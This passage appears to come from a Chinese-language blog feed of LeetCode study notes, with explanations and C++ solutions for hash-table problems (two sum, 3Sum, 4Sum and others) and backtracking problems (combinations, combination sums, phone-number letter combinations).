(hash[i] != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="349-两个数组的交集"><a href="#349-两个数组的交集" class="headerlink" title="349. 两个数组的交集"></a><a href="https://leetcode.cn/problems/intersection-of-two-arrays/">349. 两个数组的交集</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011125578.png" alt="image-20241001112553527"></p>
<p>本题的用例范围不大，依然可以同上题使用数组当作hash表，这里用一下set</p>
<p>值得注意的是本题需要两个set，第一个对nums1去重，第二个对nums2收获结果的时候进行去重</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">intersection</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="keyword">int</span>&gt; hash;</span><br><span class="line">        unordered_set&lt;<span class="keyword">int</span>&gt; resSet;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums1.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            hash.<span class="built_in">insert</span>(nums1[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; nums2.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (hash.<span class="built_in">count</span>(nums2[j])) &#123;</span><br><span class="line">                resSet.<span class="built_in">insert</span>(nums2[j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">res</span><span class="params">(resSet.begin(), resSet.end())</span></span>;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1. 两数之和"></a><a href="https://leetcode.cn/problems/two-sum/">1. 两数之和</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011126942.png" alt="image-20241001112632876"></p>
<p>本题是一道需要用到map的题目</p>
<p>使用unordered_map，其底层为哈希表，查找效率为O(1)</p>
<p>用当前元素值当key，去寻找已经遍历过的元素中是否有key=target-nums[i]的</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; mp;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">auto</span> iter = mp.<span class="built_in">find</span>(target - nums[i]);</span><br><span class="line">            <span class="keyword">if</span> (iter == mp.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                mp.<span class="built_in">insert</span>(&#123;nums[i], i&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(i);</span><br><span class="line">                res.<span class="built_in">push_back</span>(iter-&gt;second);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="454-四数相加-II"><a href="#454-四数相加-II" class="headerlink" title="454. 四数相加 II"></a><a href="https://leetcode.cn/problems/4sum-ii/">454. 四数相加 II</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011126182.png" alt="image-20241001112640126"></p>
<p>思路：类比上一题，继续用map记录某个数字出现的次数，用另一个循环去map中找是否已经出现过，结果每次加上它出现的次数即可</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fourSumCount</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2, vector&lt;<span class="keyword">int</span>&gt;&amp; nums3,</span></span></span><br><span class="line"><span class="params"><span class="function">                     vector&lt;<span class="keyword">int</span>&gt;&amp; nums4)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; mp;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums1.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; nums2.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">                <span class="keyword">auto</span> iter = mp.<span class="built_in">find</span>(nums1[i] + nums2[j]);</span><br><span class="line">                <span class="keyword">if</span> (iter == mp.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                    mp.<span class="built_in">insert</span>(&#123;nums1[i] + nums2[j], <span class="number">1</span>&#125;);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    iter-&gt;second++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums3.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; nums4.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">                <span class="keyword">auto</span> iter = mp.<span class="built_in">find</span>(<span class="number">0</span> - (nums3[i] + nums4[j]));</span><br><span class="line">                <span class="keyword">if</span> (iter != mp.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                    res+=iter-&gt;second;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="15-三数之和"><a href="#15-三数之和" class="headerlink" title="15. 三数之和"></a><a href="https://leetcode.cn/problems/3sum/">15. 三数之和</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011126359.png" alt="image-20241001112647280"></p>
<p>本题的难点在于如下几个细节</p>
<ol>
<li>去重，这里去重的逻辑和后边回溯树层去重的逻辑有一些类似，都是如果有连续重复项，那么后一项的情况一定被前一项所包含，所以判断后一项是否等于前一项，等于的话就continue</li>
<li>left和right去重并移动之后要continue</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">threeSum</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">int</span> cur = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> left = cur + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> right = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> temp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (cur; cur &lt; nums.<span class="built_in">size</span>(); cur++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[cur] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 最小的都比0大了，直接退出</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// cur也要去重</span></span><br><span class="line">            <span class="keyword">if</span> (cur &gt; <span class="number">0</span> &amp;&amp; nums[cur] == nums[cur - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            left = cur + <span class="number">1</span>;</span><br><span class="line">            right = nums.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">                <span class="keyword">if</span> (left &gt; cur + <span class="number">1</span> &amp;&amp; nums[left] == nums[left - <span class="number">1</span>]) &#123;</span><br><span class="line">                    left++;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (right &lt; nums.<span class="built_in">size</span>() - <span class="number">1</span> &amp;&amp; nums[right] == nums[right + <span class="number">1</span>]) &#123;</span><br><span class="line">                    right--;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                temp = nums[cur] + nums[left] + nums[right];</span><br><span class="line">                <span class="keyword">if</span> (temp &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    right--;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (temp &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    left++;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    res.<span class="built_in">push_back</span>(&#123;nums[cur], nums[left], nums[right]&#125;);</span><br><span class="line">                    left++;</span><br><span class="line">                    right--;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h4 id="18-四数之和"><a href="#18-四数之和" class="headerlink" title="18. 四数之和"></a><a href="https://leetcode.cn/problems/4sum/">18. 四数之和</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011126473.png" alt="image-20241001112656405"></p>
<p>和上一题一样，先进行排序</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">fourSum</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="comment">// 这题还是使用双指针把四次方降低为三次方</span></span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="keyword">int</span> temp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (target &gt;= <span class="number">0</span> &amp;&amp; nums[i] &gt; target) &#123;</span><br><span class="line">                <span class="comment">// 最小的都比target大了,后边情况直接不看了</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="comment">// 去重</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j &gt; i + <span class="number">1</span> &amp;&amp; nums[j] == nums[j - <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="comment">// 去重</span></span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">int</span> left = j + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">int</span> right = n - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">                    <span class="comment">// 去重</span></span><br><span class="line">                    <span class="keyword">if</span> (left &gt; j + <span class="number">1</span> &amp;&amp; nums[left] == nums[left - <span class="number">1</span>]) &#123;</span><br><span class="line">                        left++;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (right &lt; n - <span class="number">1</span> &amp;&amp; nums[right] == nums[right + <span class="number">1</span>]) &#123;</span><br><span class="line">                        right--;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//有一个用例超过了int的范围</span></span><br><span class="line">                    <span class="keyword">long</span> temp = (<span class="keyword">long</span>)nums[i] + nums[j] + nums[left] + nums[right];</span><br><span class="line">                    <span class="keyword">if</span> (temp &gt; target) &#123;</span><br><span class="line">                        right--;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (temp &lt; target) &#123;</span><br><span class="line">                        left++;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        res.<span class="built_in">push_back</span>(</span><br><span class="line">                            &#123;nums[i], nums[j], nums[left], nums[right]&#125;);</span><br><span class="line">                        left++;</span><br><span class="line">                        right--;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>思考:为什么设置<code>low,high,left,right</code>四个指针的<code>O(n²)</code>解法不行,因为这样当<code>left</code>和<code>right</code>遍历一遍完成的时候,根据最后一次的<code>temp</code>大小关系去移动<code>low</code>和<code>high</code>会导致丢失很多情况(思考一下就知道了)</p>
</blockquote>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>回溯</title>
    <url>/2024/09/28/%E5%9B%9E%E6%BA%AF/</url>
    <content><![CDATA[<h1 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h1><h2 id="回溯算法能解决的问题"><a href="#回溯算法能解决的问题" class="headerlink" title="回溯算法能解决的问题"></a>回溯算法能解决的问题</h2><p>排列组合</p>
<p>分割</p>
<p>棋盘</p>
<h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(参数)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(收获结果的条件)&#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>()&#123;</span><br><span class="line">        压栈</span><br><span class="line">        递归调用</span><br><span class="line">        回溯</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于回溯问题要多画递归调用树    </p>
<h2 id="组合问题"><a href="#组合问题" class="headerlink" title="组合问题"></a>组合问题</h2><h3 id="去重"><a href="#去重" class="headerlink" title="去重:"></a>去重:</h3><ol>
<li>树层去重用set,如果数组有序并且每一层的起始位置都不相同则可以在i&gt;startindex的情况下和前一个元素比较</li>
<li>树枝去重用used数组,跟着path一起回溯即可</li>
</ol>
<h4 id="77-组合"><a href="#77-组合" class="headerlink" title="77. 组合"></a><a href="https://leetcode.cn/problems/combinations/">77. 组合</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011127260.png" alt="image-20241001112711187"></p>
<p>很经典的回溯题目,组合的话每次从i+1开始</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">combine</span>(<span class="keyword">int</span> n, <span class="keyword">int</span> k) &#123;</span><br><span class="line">        <span class="built_in">backTracking</span>(n, k, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> k, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (path.<span class="built_in">size</span>() == k) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt;= n; i++) &#123;</span><br><span class="line"></span><br><span class="line">            path.<span class="built_in">push_back</span>(i);</span><br><span class="line">            <span class="built_in">backTracking</span>(n, k, i + <span class="number">1</span>);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可以在for循环前附加一步剪枝操作,当剩余的元素加上已经进入path的元素数量不足k个时直接break</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(path.<span class="built_in">size</span>()+n-i+<span class="number">1</span>&lt;k)&#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="216-组合总和-III"><a href="#216-组合总和-III" class="headerlink" title="216. 组合总和 III"></a><a href="https://leetcode.cn/problems/combination-sum-iii/">216. 组合总和 III</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011127124.png" alt="image-20241001112719047"></p>
<p>类似于上一题</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">combinationSum3</span>(<span class="keyword">int</span> k, <span class="keyword">int</span> n) &#123;</span><br><span class="line">        <span class="built_in">backTracking</span>(k, n, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span> n, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (path.<span class="built_in">size</span>() &gt; k || sum &gt; n) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sum == n &amp;&amp; path.<span class="built_in">size</span>() == k) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt;= <span class="number">9</span>; i++) &#123;</span><br><span class="line">            sum += i;</span><br><span class="line">            path.<span class="built_in">push_back</span>(i);</span><br><span class="line">            <span class="built_in">backTracking</span>(k, n, i + <span class="number">1</span>);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">            sum -= i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="17-电话号码的字母组合"><a href="#17-电话号码的字母组合" class="headerlink" title="17. 电话号码的字母组合"></a><a href="https://leetcode.cn/problems/letter-combinations-of-a-phone-number/">17. 电话号码的字母组合</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011127462.png" alt="image-20241001112741385"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map&lt;<span class="keyword">char</span>, string&gt; mp = &#123;</span><br><span class="line">        &#123;<span class="string">&#x27;2&#x27;</span>, <span class="string">&quot;abc&quot;</span>&#125;, &#123;<span class="string">&#x27;3&#x27;</span>, <span class="string">&quot;def&quot;</span>&#125;,  &#123;<span class="string">&#x27;4&#x27;</span>, <span class="string">&quot;ghi&quot;</span>&#125;, &#123;<span class="string">&#x27;5&#x27;</span>, <span class="string">&quot;jkl&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;6&#x27;</span>, <span class="string">&quot;mno&quot;</span>&#125;, &#123;<span class="string">&#x27;7&#x27;</span>, <span class="string">&quot;pqrs&quot;</span>&#125;, &#123;<span class="string">&#x27;8&#x27;</span>, <span class="string">&quot;tuv&quot;</span>&#125;, &#123;<span class="string">&#x27;9&#x27;</span>, <span class="string">&quot;wxyz&quot;</span>&#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    vector&lt;string&gt; res;</span><br><span class="line">    string path;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">letterCombinations</span><span class="params">(string digits)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (digits == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">backTracking</span>(digits, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(string digits, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (path.<span class="built_in">length</span>() == digits.<span class="built_in">length</span>()) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt; digits.<span class="built_in">length</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; mp[digits[i]].<span class="built_in">length</span>(); j++) &#123;</span><br><span class="line">                path.<span class="built_in">push_back</span>(mp[digits[i]][j]);</span><br><span class="line">                <span class="built_in">backTracking</span>(digits, i + <span class="number">1</span>);</span><br><span class="line">                path.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>但是上面的代码虽然结果对了,for循环有问题,上面代码的意思是让每个数字对应的字母都当头去尝试了,但事实上只需要第一个数字的字母打头</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    unordered_map&lt;<span class="keyword">char</span>, string&gt; mp = &#123;</span><br><span class="line">        &#123;<span class="string">&#x27;2&#x27;</span>, <span class="string">&quot;abc&quot;</span>&#125;, &#123;<span class="string">&#x27;3&#x27;</span>, <span class="string">&quot;def&quot;</span>&#125;,  &#123;<span class="string">&#x27;4&#x27;</span>, <span class="string">&quot;ghi&quot;</span>&#125;, &#123;<span class="string">&#x27;5&#x27;</span>, <span class="string">&quot;jkl&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&#x27;6&#x27;</span>, <span class="string">&quot;mno&quot;</span>&#125;, &#123;<span class="string">&#x27;7&#x27;</span>, <span class="string">&quot;pqrs&quot;</span>&#125;, &#123;<span class="string">&#x27;8&#x27;</span>, <span class="string">&quot;tuv&quot;</span>&#125;, &#123;<span class="string">&#x27;9&#x27;</span>, <span class="string">&quot;wxyz&quot;</span>&#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    vector&lt;string&gt; res;</span><br><span class="line">    string path;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">letterCombinations</span><span class="params">(string digits)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (digits == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">backTracking</span>(digits, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(string digits, <span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (path.<span class="built_in">length</span>() == digits.<span class="built_in">length</span>()) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; mp[digits[index]].<span class="built_in">length</span>(); j++) &#123;</span><br><span class="line">            path.<span class="built_in">push_back</span>(mp[digits[index]][j]);</span><br><span class="line">            <span class="built_in">backTracking</span>(digits, index + <span class="number">1</span>);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="39-组合总和"><a href="#39-组合总和" class="headerlink" title="39. 组合总和"></a><a href="https://leetcode.cn/problems/combination-sum/">39. 组合总和</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011127973.png" alt="image-20241001112748893"></p>
<p>这题是组合问题,组合切忌不能走回头路,元素能重复出现,它也只能继续从自己开始,不能从前面开始</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; path;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">combinationSum</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target) &#123;</span><br><span class="line">        <span class="built_in">sort</span>(candidates.<span class="built_in">begin</span>(), candidates.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">backTracking</span>(candidates, target, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backTracking</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; candidates, <span class="keyword">int</span> target, <span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sum &gt; target) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sum == target) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = startIndex; i &lt; candidates.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; candidates[i] == candidates[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 需要树层去重</span></span><br><span class="line"></span><br><span class="line">            sum += candidates[i];</span><br><span class="line">            path.<span class="built_in">push_back</span>(candidates[i]);</span><br><span class="line">            <span class="built_in">backTracking</span>(candidates, target, i);</span><br><span class="line">            path.<span class="built_in">pop_back</span>();</span><br><span class="line">            sum -= candidates[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="40-组合总和-II"><a href="#40-组合总和-II" class="headerlink" title="40. 组合总和 II"></a><a href="https://leetcode.cn/problems/combination-sum-ii/">40. 组合总和 II</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011128744.png" alt="image-20241001112800674"></p>
<p>这题的去重也很有意思,要树层去重就先排序,(它是树层去重,也就是同一层不能包含和之前访问过的值相同的元素)</p>
<p><strong>为什么要去重?</strong></p>
